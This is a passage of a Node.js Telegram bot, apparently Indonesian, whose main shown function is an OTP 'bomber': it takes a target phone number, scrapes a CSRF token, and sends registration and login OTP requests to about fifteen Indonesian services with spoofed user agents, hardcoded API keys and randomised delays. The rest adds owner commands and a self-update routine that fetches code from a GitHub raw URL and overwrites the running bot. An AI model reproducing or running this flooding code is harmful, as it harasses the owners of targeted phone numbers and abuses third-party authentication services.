                result += chars.charAt(crypto.randomInt(0, chars.length));
            }
            return `${result}@bwmyga.com`;
        };

        const getPinhomeCSRF = async () => {
            try {
                const resp = await axios.get('https://www.pinhome.id/daftar', {
                    headers: {
                        'User-Agent': randomUA(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    },
                    timeout: 10000
                });

                let csrfToken = '';
                let cookieString = '';
                const cookies = resp.headers['set-cookie'] || [];

                cookies.forEach(c => {
                    const parts = c.split(';');
                    const nameValue = parts[0];
                    cookieString += nameValue + '; ';
                    if (nameValue.includes('_X7kCsrf')) {
                        csrfToken = nameValue.split('=')[1];
                    }
                });

                if (!csrfToken) {
                    const html = resp.data;
                    const match = html.match(/"csrfToken":"([^"]+)"/) || html.match(/name="csrf-token" content="([^"]+)"/);
                    if (match) csrfToken = match[1];
                }

                if (!csrfToken) {
                    csrfToken = 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
                    cookieString = '_X7kCsrf=' + csrfToken + '; _ga=GA1.1.1752313616.1783394371; _fbp=fb.1.1783394372483.552359809276689952; _clck=dub9tf%5E2%5Eg7j%5E0%5E2379';
                }

                return { csrfToken, cookieString };
            } catch (e) {
                return {
                    csrfToken: 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8',
                    cookieString: '_X7kCsrf=v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8; _ga=GA1.1.1752313616.1783394371'
                };
            }
        };

        const sendOTPRequest = async (url, data, headers = {}) => {
            try {
                const reqHeaders = {
                    "Content-Type": "application/json",
                    "User-Agent": randomUA(),
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
                    ...headers
                };

                const resp = await axios.post(url, data, {
                    headers: reqHeaders,
                    timeout: CONFIG.timeout
                });

                if ([200, 201, 202, 204].includes(resp.status)) return true;

                const responseBody = resp.data || {};
                const successIndicators = [
                    responseBody?.success === true,
                    responseBody?.status === "success",
                    responseBody?.statusCode === 200,
                    responseBody?.status === 202,
                    responseBody?.is_success === true,
                    responseBody?.message === "OTP terkirim",
                    responseBody?.message === "OTP sent successfully",
                    responseBody?.message === "Success.",
                    responseBody?.data?.otp === "processed",
                    responseBody?.data?.new_uuid,
                    responseBody?.data?.status === 1,
                    responseBody?.secretCode
                ];
                return successIndicators.some(Boolean);
            } catch (error) {
                return false;
            }
        };

        const phone = normalizePhone(target);
        const p08 = "0" + phone.slice(2);
        const p62 = phone;
        const pNoCountry = phone.replace("62", "");
        const email = generateEmail();
        const csrfData = await getPinhomeCSRF();
        
        await sendOTPRequest("https://api.maulagi.id/api/v2/auth/check", { credentials: p62 }, { "X-ML-KEY": "B10JLPEP10" });
        await randomDelay();
        
        await sendOTPRequest("https://matahari-backend-prod.matahari.com/api/auth/re-activation", { mobileCountryCode: "", mobileNumber: p08, activationCode: "" });
        await randomDelay();
        
        await sendOTPRequest("https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", 
            { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: pNoCountry },
            { "x-csrf-token": csrfData.csrfToken, "Cookie": csrfData.cookieString, "Origin": "https://www.pinhome.id", "Referer": "https://www.pinhome.id/daftar" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://www.bonusbelanja.com/api/auth/registration/app", { phone: p62, name: "User", agreeTnc: true, agreeContact: false });
        await randomDelay();
        
        await sendOTPRequest("https://www.alodokter.com/resend-otp", { user: { phone: p08, uuid: crypto.randomUUID() }, request_via: "whatsapp" });
        await randomDelay();
        
        await sendOTPRequest("https://www.beautyhaul.com/ajax/account/send_otp", { method: "WhatsApp", phone: p62 });
        await randomDelay();
        
        await sendOTPRequest("https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", 
            { nama_lengkap: "User", telepon: p08, email: `user${crypto.randomInt(1000,9999)}@mail.com` },
            { "Xid": String(crypto.randomInt(1000000, 9999999)), "source": "ocistok" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://internetrakyat.id/api/app/auth/send-otp-register", 
            { phone_number: p08 },
            { "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://api.dokterin.id/user/v1/users/login", 
            { phone: p62, tnc_accept: true, device_id: crypto.randomUUID() },
            { "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://api.paper.id/api/v1/auth/login", 
            { method: "whatsapp", phone: p08 },
            { "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": crypto.randomUUID() }
        );
        await randomDelay();
        
        await sendOTPRequest("https://api.indodax.com/api/v1/otp/send", 
            { email: email, flow: "register", method: "whatsapp", old_uuid: "" },
            { "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://cms.bunda.co.id/api/v1/auth/send-otp", 
            { phone_number: p62, type: "auth" },
            { "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://api.fastwork.id/auth/v2/signup.sendVerificationCode", { phone_number: p08 });
        await randomDelay();
        
        await sendOTPRequest("https://saturdays.com/api/v1/auth/otp", { phone: p62, type: "register" });
        await randomDelay();
        
        await sendOTPRequest("https://api.saturdays.com/v2/user/otp/request", { phoneNumber: p62, channel: "whatsapp" });

        return true;
    } catch (error) {
        return false;
    }
}
//


// ============ SISTEM OWNER + AUTO UPDATE ============
const ownersFile = './database/owners.json';
const UPDATE_REPO_RAW = "https://raw.githubusercontent.com/ApongSakata/Auto-Update-Xtrash/main/main.js";
const UPDATE_GITHUB_TOKEN = process.env.GITHUB_TOKEN || ""; // isi jika repo private
const UPDATE_TARGET = path.join(__dirname, "main.js");
const UPDATE_BACKUP = path.join(__dirname, "main.backup.js");
const UPDATE_TEMP = path.join(__dirname, "main.new.js");

function loadOwners() {
    try {
        const list = JSON.parse(fs.readFileSync(ownersFile, 'utf8'));
        return Array.isArray(list) ? list.map(String) : [];
    } catch {
        return [];
    }
}

function saveOwners(list) {
    const dir = path.dirname(ownersFile);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(ownersFile, JSON.stringify([...new Set(list.map(String))], null, 2));
}

// ownerID di settings/config.js = owner utama (selalu punya akses)
function isBotOwner(userId) {
    return String(userId) === String(ownerID) || loadOwners().includes(String(userId));
}

function getTargetId(ctx) {
    const arg = ctx.message.text.split(/\s+/)[1];
    if (arg && /^\d+$/.test(arg)) return arg;
    return ctx.message.reply_to_message?.from?.id?.toString() || null;
}

bot.command("addowner", async (ctx) => {
    if (!isBotOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner!");

    const targetId = getTargetId(ctx);
    if (!targetId) return ctx.reply("📌 /addowner 123456789\natau reply pesan orangnya");

    if (isBotOwner(targetId)) return ctx.reply("⚠️ User itu sudah jadi owner!");

    const owners = loadOwners();
    owners.push(targetId);
    saveOwners(owners);
    ctx.reply(`✅ Owner berhasil ditambahkan!\n🆔 ${targetId}`);
});

bot.command("delowner", async (ctx) => {
    if (!isBotOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner!");

    const targetId = getTargetId(ctx);
    if (!targetId) return ctx.reply("📌 /delowner 123456789\natau reply pesan orangnya");

    if (targetId === String(ownerID)) return ctx.reply("❌ Owner utama tidak bisa dihapus!");

    const owners = loadOwners();
    if (!owners.includes(targetId)) return ctx.reply("❌ User itu bukan owner!");

    saveOwners(owners.filter(id => id !== targetId));
    ctx.reply(`✅ Owner berhasil dihapus!\n🆔 ${targetId}`);
});

bot.command("listowner", async (ctx) => {
    if (!isBotOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner!");

    const owners = loadOwners().filter(id => id !== String(ownerID));
    let list = `<blockquote>👑 DAFTAR OWNER\n━━━━━━━━━━━━━━━━━━━━━━\n1. ${ownerID} (utama)\n`;
    owners.forEach((id, i) => { list += `${i + 2}. ${id}\n`; });
    list += `━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: ${owners.length + 1} owner</blockquote>`;
    ctx.reply(list, { parse_mode: 'HTML' });
});

let isUpdating = false;

bot.command("update", async (ctx) => {
    if (!isBotOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner!");
    if (isUpdating) return ctx.reply("⚠️ Update sedang berjalan, tunggu sebentar.");
    isUpdating = true;

    const status = await ctx.reply(
        "╭━━〔 ⏳ *UPDATE SYSTEM* 〕━━⬣\n" +
        "┃\n" +
        "┃ 🔍 Mengecek update...\n" +
        "┃\n" +
        "╰━━━━━━━━━━━━━━━━━━⬣",
        { parse_mode: "Markdown" }
    );

    const edit = (text) =>
        ctx.telegram
            .editMessageText(ctx.chat.id, status.message_id, undefined, text, {
                parse_mode: "Markdown",
            })
            .catch(() => {});

    try {
        const { data } = await axios.get(UPDATE_REPO_RAW, {
            timeout: 15000,
            responseType: "text",
            transformResponse: (r) => r,
            headers: {
                "Cache-Control": "no-cache",
                ...(UPDATE_GITHUB_TOKEN && { Authorization: `token ${UPDATE_GITHUB_TOKEN}` }),
            },
        });

        if (typeof data !== "string" || data.trim().length < 1000) {
            throw new Error("File kosong atau tidak valid.");
        }

        if (fs.readFileSync(UPDATE_TARGET, "utf8") === data) {
            isUpdating = false;
            return edit(
                "╭━━〔 ✅ *SUDAH TERBARU* 〕━━⬣\n" +
                "┃\n" +
                "┃ 📦 Bot sudah di versi\n" +
                "┃     paling baru\n" +
                "┃ ✨ Tidak ada perubahan\n" +
                "┃\n" +
                "╰━━━━━━━━━━━━━━━━━━⬣"
            );
        }

        try {
            new vm.Script(data, { filename: "main.js" });
        } catch (err) {
            throw new Error(`Syntax error di file baru: ${err.message}`);
        }

        fs.copyFileSync(UPDATE_TARGET, UPDATE_BACKUP);
        fs.writeFileSync(UPDATE_TEMP, data);
        fs.renameSync(UPDATE_TEMP, UPDATE_TARGET);

        await edit(
            "╭━━〔 ✅ *UPDATE BERHASIL* 〕━━⬣\n" +
            "┃\n" +
            "┃ 📦 Status   : `Success`\n" +
            "┃ 💾 Backup   : `Tersimpan`\n" +
            "┃ 🔄 Aksi     : Restart Panel\n" +
            "┃ ⏳ Estimasi : ± 5 detik\n" +
            "┃\n" +
            "┃ _Panel akan kembali online_\n" +
            "┃ _secara otomatis..._\n" +
            "┃\n" +
            "╰━━━━━━━━━━━━━━━━━━⬣"
        );

        setTimeout(() => process.exit(1), 1500);
    } catch (e) {
        console.error("[UPDATE ERROR]", e.message);
        if (fs.existsSync(UPDATE_TEMP)) fs.unlinkSync(UPDATE_TEMP);

        let reason = e.message;
        if (e.response?.status === 404) reason = "file main.js belum di update oleh @ApongSkt";
        else if (e.code === "ECONNABORTED") reason = "Koneksi timeout.";

        await edit(
            "╭━━〔 ❌ *UPDATE GAGAL* 〕━━⬣\n" +
            "┃\n" +
            "┃ ⚠️ Alasan:\n" +
            `┃ ${reason}\n` +
            "┃\n" +
            "┃ 💡 Bot tetap berjalan\n" +
            "┃     dengan versi lama\n" +
            "┃\n" +
            "╰━━━━━━━━━━━━━━━━━━⬣"
        );

        isUpdating = false;
    }
});
// ============ END OWNER + AUTO UPDATE ============


bot.launch()
